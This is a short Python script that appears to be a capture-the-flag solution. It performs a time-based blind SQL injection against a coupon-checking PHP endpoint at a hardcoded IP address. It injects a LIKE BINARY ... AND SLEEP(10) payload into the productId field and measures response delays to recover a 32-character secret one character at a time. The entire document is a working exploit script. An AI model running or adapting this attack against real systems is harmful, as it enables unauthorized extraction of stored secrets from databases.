import requests, time

url = 'http://139.180.137.27:11322/checkcoupon.php'

def time_get_page(query_dict, password):
	print('\tTrying password "{0}..."'.format(password))
	start = time.time()
	r = requests.post(url, data= query_dict)
	end = time.time()
	elapsed = end - start
	return elapsed

def get_password():
	possible_chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_'
	password = ""
	index = 0
	while True:
		if len(password) == 32:
			return password
		password_times = {
			time_get_page({
				"productId": 'PD3" AND code LIKE BINARY "{0}" AND SLEEP(10) #'.format("".join([password, char, '%']))
			}, "".join([password, char])): char
			for char in possible_chars
		}
		longest_time = max(password_times)
		password = "".join([password, password_times[longest_time]])
		print(longest_time)
		print('\nPassword: {0}\n'.format(password))

def main():
	print get_password()


if __name__ == "__main__":
	main()